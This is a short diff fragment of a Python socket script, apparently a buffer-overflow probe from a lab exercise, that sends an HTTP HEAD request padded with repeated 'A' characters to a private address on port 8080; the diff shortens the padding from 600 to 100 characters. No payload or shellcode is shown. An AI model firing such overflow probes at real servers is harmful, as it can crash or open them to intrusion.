@@ -9,7 +9,7 @@ import socket
 
 target = "192.168.1.18"
 port   = 8080
-data = "A"*600
+data = "A"*100
 
 buffer = (
 "HEAD /" + data + " HTTP/1.1\r\n"
